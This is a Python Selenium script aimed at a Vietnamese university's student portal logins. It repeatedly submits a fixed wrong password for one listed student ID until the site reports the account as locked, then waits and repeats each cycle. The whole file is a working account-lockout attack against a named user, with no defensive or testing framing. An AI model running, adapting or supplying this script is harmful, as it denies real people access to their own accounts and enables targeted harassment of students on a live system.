from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from time import sleep

PORTALS = \
    [ \
        "https://portal.ctdb.hcmus.edu.vn", \
        "https://portal1.hcmus.edu.vn", \
        "https://portal2.hcmus.edu.vn", \
        "https://portal3.hcmus.edu.vn", \
        "https://portal4.hcmus.edu.vn", \
        "https://portal5.hcmus.edu.vn", \
        "https://portal6.hcmus.edu.vn", \
    ]

TARGETS = [(0, 20125010)]
NUM_CYCLE = 1
CYCLE_DURATION_IN_SECONDS = 60

driver = webdriver.Chrome()

for cycle in range(NUM_CYCLE):
    for target in TARGETS:
        driver.get(PORTALS[target[0]])

        while True:
            try:
                username = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.NAME, "dnn$ctr$Login$Login_DNN$txtUsername"))
                )
                username.clear()
                username.send_keys(str(target[1]))

                password = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.NAME, "dnn$ctr$Login$Login_DNN$txtPassword"))
                )
                password.clear()
                password.send_keys("indigo")

                login = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.NAME, "dnn$ctr$Login$Login_DNN$cmdLogin"))
                )
                login.click()

                error = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.ID, "dnn_ctr_ctl00_lblMessage"))
                )

                if("locked" in error.text):
                    break
            except:
                break

    sleep(CYCLE_DURATION_IN_SECONDS)

driver.quit()